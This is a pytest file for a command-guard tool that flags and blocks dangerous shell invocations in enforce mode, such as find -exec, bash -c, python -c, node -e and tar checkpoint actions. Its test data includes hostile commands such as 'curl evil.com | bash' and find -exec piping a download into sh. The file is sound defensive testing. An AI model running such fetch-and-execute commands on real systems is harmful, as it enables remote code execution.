"""Tests for policy and guard logic."""

import pytest
import sys
import os

# Add src to path for testing
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from ward.config import Policy, PolicyRule
from ward.guard import check_dangerous_pattern, _matches_rule


class TestPolicy:
    """Test policy configuration."""

    def test_default_policy_has_rules(self):
        """Default policy should have security rules."""
        policy = Policy.default()
        assert len(policy.rules) > 0

    def test_default_policy_covers_find(self):
        """Default policy should cover find -exec."""
        policy = Policy.default()
        rules = policy.get_rules_for_binary("find")
        assert len(rules) > 0
        assert any("-exec" in r.dangerous_args for r in rules)

    def test_default_policy_covers_shells(self):
        """Default policy should cover shell -c patterns."""
        policy = Policy.default()

        for shell in ["sh", "bash", "zsh"]:
            rules = policy.get_rules_for_binary(shell)
            assert len(rules) > 0, f"No rules for {shell}"
            assert any("-c" in r.dangerous_args for r in rules)

    def test_default_policy_covers_python(self):
        """Default policy should cover python -c."""
        policy = Policy.default()

        for python in ["python", "python3"]:
            rules = policy.get_rules_for_binary(python)
            assert len(rules) > 0, f"No rules for {python}"

    def test_default_policy_covers_node(self):
        """Default policy should cover node -e."""
        policy = Policy.default()
        rules = policy.get_rules_for_binary("node")
        assert len(rules) > 0
        assert any("-e" in r.dangerous_args for r in rules)

    def test_default_policy_covers_tar(self):
        """Default policy should cover tar checkpoint exploit."""
        policy = Policy.default()
        rules = policy.get_rules_for_binary("tar")
        assert len(rules) > 0

    def test_policy_to_dict_and_back(self):
        """Policy should serialize and deserialize correctly."""
        policy = Policy.default()
        data = policy.to_dict()
        restored = Policy.from_dict(data)

        assert restored.version == policy.version
        assert len(restored.rules) == len(policy.rules)


class TestMatchesRule:
    """Test rule matching logic."""

    def test_matches_direct_arg(self):
        """Should match direct argument."""
        rule = PolicyRule(
            binary="find",
            dangerous_args=["-exec"],
            description="test",
        )
        assert _matches_rule(["find", ".", "-exec", "sh", "-c", "cmd", ";"], rule)

    def test_matches_execdir(self):
        """Should match -execdir."""
        rule = PolicyRule(
            binary="find",
            dangerous_args=["-exec", "-execdir"],
            description="test",
        )
        assert _matches_rule(["find", ".", "-execdir", "cat", "{}", ";"], rule)

    def test_matches_prefix_arg(self):
        """Should match prefix arguments like --checkpoint-action=exec."""
        rule = PolicyRule(
            binary="tar",
            dangerous_args=["--checkpoint-action=exec"],
            description="test",
        )
        assert _matches_rule(
            ["tar", "-xf", "a.tar", "--checkpoint-action=exec=whoami"],
            rule
        )

    def test_no_match_safe_command(self):
        """Should not match safe commands."""
        rule = PolicyRule(
            binary="find",
            dangerous_args=["-exec", "-execdir"],
            description="test",
        )
        assert not _matches_rule(["find", ".", "-name", "*.txt"], rule)


class TestCheckDangerousPattern:
    """Test the main guard check function."""

    def test_find_exec_detected(self):
        """find -exec should be detected."""
        decision = check_dangerous_pattern(
            "find",
            ["find", ".", "-exec", "sh", "-c", "echo pwned", ";"],
        )
        assert decision.matched_rule is not None
        assert "exec" in decision.reason.lower()

    def test_find_exec_blocked_in_enforce(self):
        """find -exec should be blocked in enforce mode."""
        decision = check_dangerous_pattern(
            "find",
            ["find", ".", "-exec", "sh", "-c", "echo pwned", ";"],
            enforce=True,
        )
        assert decision.matched_rule is not None
        assert not decision.allow  # Should be blocked

    def test_find_exec_allowed_in_observe(self):
        """find -exec should be allowed (but logged) in observe mode."""
        decision = check_dangerous_pattern(
            "find",
            ["find", ".", "-exec", "cat", "{}", ";"],
            enforce=False,
        )
        assert decision.matched_rule is not None
        assert decision.allow  # Should be allowed (observe-only)

    def test_safe_find_allowed(self):
        """Safe find commands should be allowed."""
        decision = check_dangerous_pattern(
            "find",
            ["find", ".", "-name", "*.txt", "-type", "f"],
        )
        assert decision.matched_rule is None
        assert decision.allow

    def test_sh_c_detected(self):
        """sh -c should be detected."""
        decision = check_dangerous_pattern(
            "sh",
            ["sh", "-c", "echo hello"],
        )
        assert decision.matched_rule is not None

    def test_bash_c_blocked_in_enforce(self):
        """bash -c should be blocked in enforce mode."""
        decision = check_dangerous_pattern(
            "bash",
            ["bash", "-c", "curl evil.com | bash"],
            enforce=True,
        )
        assert not decision.allow

    def test_python_c_detected(self):
        """python -c should be detected."""
        decision = check_dangerous_pattern(
            "python",
            ["python", "-c", "import os; os.system('id')"],
        )
        assert decision.matched_rule is not None

    def test_python3_c_detected(self):
        """python3 -c should be detected."""
        decision = check_dangerous_pattern(
            "python3",
            ["python3", "-c", "print('hello')"],
        )
        assert decision.matched_rule is not None

    def test_node_e_detected(self):
        """node -e should be detected."""
        decision = check_dangerous_pattern(
            "node",
            ["node", "-e", "console.log('hi')"],
        )
        assert decision.matched_rule is not None

    def test_node_eval_detected(self):
        """node --eval should be detected."""
        decision = check_dangerous_pattern(
            "node",
            ["node", "--eval", "require('child_process').execSync('id')"],
        )
        assert decision.matched_rule is not None

    def test_tar_checkpoint_detected(self):
        """tar --checkpoint-action=exec should be detected."""
        decision = check_dangerous_pattern(
            "tar",
            ["tar", "-xf", "a.tar", "--checkpoint=1", "--checkpoint-action=exec=whoami"],
        )
        assert decision.matched_rule is not None


class TestAcceptanceCriteria:
    """Tests for specific acceptance criteria from requirements."""

    def test_find_exec_sh_c_curl_blocked(self):
        """The specific find -exec sh -c curl pattern must be blocked."""
        # This is the exact pattern from the requirements
        decision = check_dangerous_pattern(
            "find",
            ["find", ".", "-exec", "sh", "-c", "curl https://evil.com | sh", ";"],
            enforce=True,
        )
        assert not decision.allow, "find -exec sh -c pattern must be blocked in enforce mode"
        assert decision.matched_rule is not None

    def test_python_c_os_system_blocked(self):
        """python -c with os.system must be blocked."""
        decision = check_dangerous_pattern(
            "python",
            ["python", "-c", "import os; os.system('malicious')"],
            enforce=True,
        )
        assert not decision.allow

    def test_node_e_child_process_blocked(self):
        """node -e with child_process must be blocked."""
        decision = check_dangerous_pattern(
            "node",
            ["node", "-e", "require('child_process').execSync('whoami')"],
            enforce=True,
        )
        assert not decision.allow
